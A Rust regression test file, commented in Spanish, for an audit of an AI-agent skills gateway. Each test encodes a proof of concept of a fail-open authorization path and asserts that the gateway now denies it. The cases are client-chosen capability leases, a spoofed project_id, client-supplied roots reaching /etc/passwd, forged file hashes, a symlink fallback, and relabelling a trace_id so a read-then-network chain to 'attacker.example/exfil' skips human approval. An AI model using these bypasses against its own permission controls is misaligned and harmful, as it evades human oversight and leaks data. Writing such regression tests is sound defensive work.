//! Regresión de la auditoría 2026-11-25: rutas fail-open en `skills.propose_effect`
//! (H-09, H-12, H-13; PoC SKL-P0..P6 del PR 108).
//!
//! Cada test afirma el comportamiento SEGURO. Fallaban sobre `2a004f3b`; pasan desde que el
//! gateway fija en el servidor reloj, raíces, política de proyecto, hash previo y traza.
//!
//! Patrón común: la decisión de autorización usaba campos que llegan en el input del
//! cliente MCP (época, lease, `allowed_roots`, `project_id`, `trace_id`, hash
//! observado) sin ancla en estado del servidor.

use babylon60::capability::sha256_digest;
use babylon_skills_mcp::{ImmutableSkillsSnapshot, SkillsMcpGateway, GATEWAY_EXPECTED_AUDIENCE};
use serde_json::{json, Value};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

fn repo_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .parent()
        .unwrap()
        .to_path_buf()
}

/// Catálogo real + raíz global que liga `c5-gemini-api-2026-standards` (READ_EXT,
/// EXTERNAL_NETWORK) a un artefacto físico, igual que el fixture de FL-P09 en lib.rs.
fn snapshot() -> ImmutableSkillsSnapshot {
    let root = repo_root();
    let global = tempfile::tempdir().unwrap();
    for name in ["cortex-skill-genesis", "c5-gemini-api-2026-standards"] {
        let dir = global.path().join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("SKILL.md"),
            format!("---\nname: {name}\n---\n# {name}\nfixture body\n"),
        )
        .unwrap();
    }
    ImmutableSkillsSnapshot::load_with_globals(
        Some(&root.join("docs/skills.json")),
        Some(&root.join(".agents/skills")),
        &[global.path()],
        None,
    )
    .unwrap()
}

fn identity(gw: &SkillsMcpGateway, skill: &str) -> (String, String) {
    let s = gw.snapshot().resolve(skill).unwrap();
    (s.version.clone(), s.tool_identity_hash.clone())
}

#[allow(clippy::too_many_arguments)]
fn propose(
    gw: &SkillsMcpGateway,
    skill: &str,
    project_id: &str,
    nonce: &str,
    arguments: Value,
    precondition: Value,
    extra_cred: Value,
    trace_id: Option<&str>,
) -> Value {
    let (version, tih) = identity(gw, skill);
    let mut cred = json!({
        "audience": GATEWAY_EXPECTED_AUDIENCE,
        "project_id": project_id,
        "nonce": nonce,
    });
    if let Value::Object(extra) = extra_cred {
        for (k, v) in extra {
            cred[k] = v;
        }
    }
    let mut args = json!({
        "skill_id": skill,
        "version": version,
        "tool_identity_hash": tih,
        "arguments": arguments,
        "precondition_snapshot": precondition,
        "credential": cred,
    });
    if let Some(t) = trace_id {
        args["trace_id"] = json!(t);
    }
    gw.handle_skills_propose_effect(args.as_object().unwrap())
}

/// SKL-P1 · HIGH · El lease de la capacidad lo elige el cliente.
///
/// Sin `set_authoritative_epoch` (el binario stdio nunca lo llama), `current_epoch`
/// y `expires_at_epoch` salen de la credencial del cliente. Un cliente pide
/// `expires_at_epoch = u64::MAX` y obtiene una `ActionCapability` que no caduca.
/// También permite revivir una credencial caducada declarando una época anterior.
#[test]
fn skl_p1_client_chosen_lease_is_not_honoured_without_server_clock() {
    let gw = SkillsMcpGateway::new(snapshot(), false);
    let r = propose(
        &gw,
        "thermo-audit",
        "babylon60",
        "p1-lease",
        json!({"target_path": "workspace://src/lib.rs"}),
        json!({"allowed_roots": ["workspace://"]}),
        json!({"current_epoch": 1, "expires_at_epoch": u64::MAX}),
        None,
    );
    let lease = r["action_capability"]["expires_at_epoch"].as_u64();
    assert!(
        r["status"] != "AUTHORIZED" || lease != Some(u64::MAX),
        "FAIL-OPEN SKL-P1: lease elegido por el cliente aceptado (status={}, expires_at_epoch={:?})",
        r["status"],
        lease
    );
}

/// SKL-P2 · HIGH · La política por proyecto se elude cambiando `project_id`.
///
/// `set_project_allowed_roots` y `set_project_allowlist` se indexan por el
/// `project_id` que envía el propio cliente, sin autenticar. Un `project_id` no
/// configurado cae a las raíces del cliente y a "todas las skills visibles".
#[test]
fn skl_p2_unconfigured_project_id_escapes_server_roots_and_allowlist() {
    let gw = SkillsMcpGateway::new(snapshot(), false);
    gw.set_project_allowed_roots("tenant-a", ["workspace://tenant-a"]);
    gw.set_project_allowlist("tenant-a", ["wait-what"]);

    // Control: con el project_id configurado, el servidor deniega.
    let control = propose(
        &gw,
        "thermo-audit",
        "tenant-a",
        "p2-control",
        json!({"target_path": "/etc/hosts"}),
        json!({"allowed_roots": ["/etc"]}),
        json!({}),
        None,
    );
    assert_eq!(control["status"], "DENIED", "control: {control}");

    // Mismo cliente, mismo objetivo, otro project_id inventado.
    let bypass = propose(
        &gw,
        "thermo-audit",
        "tenant-a-shadow",
        "p2-bypass",
        json!({"target_path": "/etc/hosts"}),
        json!({"allowed_roots": ["/etc"]}),
        json!({}),
        None,
    );
    assert_eq!(
        bypass["status"], "DENIED",
        "FAIL-OPEN SKL-P2: project_id no configurado elude raíces y allowlist del servidor: {bypass}"
    );
}

/// SKL-P3 · HIGH · En la configuración por defecto (la del binario) el cliente fija
/// `allowed_roots`. F-002 solo veta `"/"` y `".."`; cualquier directorio de primer
/// nivel (`/etc`, `/Users`, `/private`) equivale a "todo".
#[test]
fn skl_p3_client_supplied_allowed_roots_widen_scope_in_default_config() {
    let gw = SkillsMcpGateway::new(snapshot(), false);
    let r = propose(
        &gw,
        "thermo-audit",
        "babylon60",
        "p3-roots",
        json!({"target_path": "/etc/passwd"}),
        json!({"allowed_roots": ["/etc"]}),
        json!({}),
        None,
    );
    assert_eq!(
        r["status"], "DENIED",
        "FAIL-OPEN SKL-P3: raíz elegida por el cliente autoriza /etc/passwd: {r}"
    );
}

/// SKL-P6 · HIGH (en HEAD) · Sin `allowed_roots`, el gateway usa por defecto
/// `["workspace://", "/workspace", "."]` (`lib.rs:2065-2071`). Con el broker de HEAD,
/// la raíz `"."` autoriza cualquier ruta. El gateway ya no ofrece `"."` como raíz por
/// defecto; el atajo del broker (`src/capability.rs`, H-08) se retira aparte.
#[test]
fn skl_p6_default_roots_with_dot_authorize_any_path_when_client_omits_roots() {
    let gw = SkillsMcpGateway::new(snapshot(), false);
    let r = propose(
        &gw,
        "thermo-audit",
        "babylon60",
        "p6-default-roots",
        json!({"target_path": "/etc/passwd"}),
        json!({}),
        json!({}),
        None,
    );
    assert_eq!(
        r["status"], "DENIED",
        "FAIL-OPEN SKL-P6: raíces por defecto con '.' autorizan /etc/passwd: {r}"
    );
}

/// SKL-P4a · HIGH · Para mutaciones con ruta relativa (o `workspace://`, o
/// inexistente) el servidor no observa el disco y usa `observed_pre_hash` del
/// cliente. Basta enviar `expected_pre_hash == observed_pre_hash` inventados.
#[test]
fn skl_p4a_mutation_precondition_trusts_client_hash_for_relative_target() {
    let gw = SkillsMcpGateway::new(snapshot(), false);
    let forged = hex::encode(sha256_digest(b"forged-content"));
    // El fichero existe de verdad (cwd = directorio del crate) y su hash no es `forged`.
    let target = "tests/proposal_boundary.rs";
    assert!(Path::new(target).is_file());
    let r = propose(
        &gw,
        "apple-bypass", // STATE_MUTATION, workspace_disk
        "babylon60",
        "p4a-rel",
        json!({"target_path": target, "expected_pre_hash": forged}),
        json!({"allowed_roots": ["tests"], "observed_pre_hash": forged}),
        json!({}),
        None,
    );
    assert_eq!(
        r["status"], "DENIED",
        "FAIL-OPEN SKL-P4a: precondición de mutación satisfecha con hash del cliente: {r}"
    );
}

/// SKL-P4b · HIGH · Degradación silenciosa: si la ruta absoluta es un symlink (o la
/// lectura falla), `disk_observed_pre_hash` es `None` y se vuelve al hash del cliente
/// en lugar de denegar.
#[test]
fn skl_p4b_symlink_target_falls_back_to_client_hash() {
    let gw = SkillsMcpGateway::new(snapshot(), false);
    let lab = tempfile::tempdir().unwrap();
    let real = lab.path().join("real");
    std::fs::write(&real, b"actual-content").unwrap();
    let link = lab.path().join("link");
    std::os::unix::fs::symlink(&real, &link).unwrap();
    let forged = hex::encode(sha256_digest(b"forged-content"));
    let r = propose(
        &gw,
        "apple-bypass",
        "babylon60",
        "p4b-link",
        json!({"target_path": link, "expected_pre_hash": forged}),
        json!({"allowed_roots": [lab.path()], "observed_pre_hash": forged}),
        json!({}),
        None,
    );
    assert_eq!(
        r["status"], "DENIED",
        "FAIL-OPEN SKL-P4b: symlink hace caer la observación de disco al hash del cliente: {r}"
    );
}

/// SKL-P5 · HIGH · FL-P09 (READ_LOCAL → EXTERNAL_NETWORK exige aprobación humana) se
/// indexa por `trace_id`, que elige el cliente. Reetiquetar la traza entre el paso de
/// lectura y el de red autoriza la cadena de exfiltración sin aprobación.
#[test]
fn skl_p5_trace_id_relabel_bypasses_read_local_to_network_composition() {
    let gw = SkillsMcpGateway::new(snapshot(), false);
    let read = propose(
        &gw,
        "thermo-audit",
        "babylon60",
        "p5-read",
        json!({"target_path": "workspace://src/lib.rs"}),
        json!({"allowed_roots": ["workspace://"]}),
        json!({}),
        Some("trace-read"),
    );
    assert_eq!(read["decision"], "ALLOW", "paso de lectura: {read}");

    let exfil = propose(
        &gw,
        "c5-gemini-api-2026-standards",
        "babylon60",
        "p5-net",
        json!({
            "target_path": "workspace://docs/README.md",
            "network_destination": "https://attacker.example/exfil"
        }),
        json!({"allowed_roots": ["workspace://"]}),
        json!({}),
        Some("trace-fresh-label"),
    );
    assert_ne!(
        exfil["decision"], "ALLOW",
        "FAIL-OPEN SKL-P5: cambiar trace_id elude FL-P09 sin aprobación humana: {exfil}"
    );
}

/// SKL-P0 · HIGH · Alcanzabilidad: el binario stdio no ofrece forma de fijar reloj ni
/// raíces del servidor, así que SKL-P1 y SKL-P3 se explotan por JSON-RPC tal cual.
#[test]
fn skl_p0_stdio_binary_authorizes_client_chosen_roots_and_lease() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_babylon-skills-mcp"))
        .current_dir(repo_root())
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    let gw = SkillsMcpGateway::new(snapshot(), false);
    let (version, tih) = identity(&gw, "thermo-audit");
    let req = json!({
        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
        "params": {"name": "skills.propose_effect", "arguments": {
            "skill_id": "thermo-audit", "version": version, "tool_identity_hash": tih,
            "arguments": {"target_path": "/etc/passwd"},
            "precondition_snapshot": {"allowed_roots": ["/etc"]},
            "credential": {
                "audience": GATEWAY_EXPECTED_AUDIENCE, "project_id": "any", "nonce": "p0",
                "current_epoch": 1, "expires_at_epoch": u64::MAX
            }
        }}
    });
    {
        let stdin = child.stdin.as_mut().unwrap();
        writeln!(stdin, "{req}").unwrap();
    }
    drop(child.stdin.take());
    let out = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    let line = stdout
        .lines()
        .next()
        .unwrap_or_else(|| panic!("el binario no respondió (exit={:?}): {stderr}", out.status));
    let resp: Value = serde_json::from_str(line).unwrap();
    assert_eq!(
        resp["result"]["status"], "DENIED",
        "FAIL-OPEN SKL-P0: el binario autoriza /etc/passwd con lease u64::MAX: {resp}"
    );
}
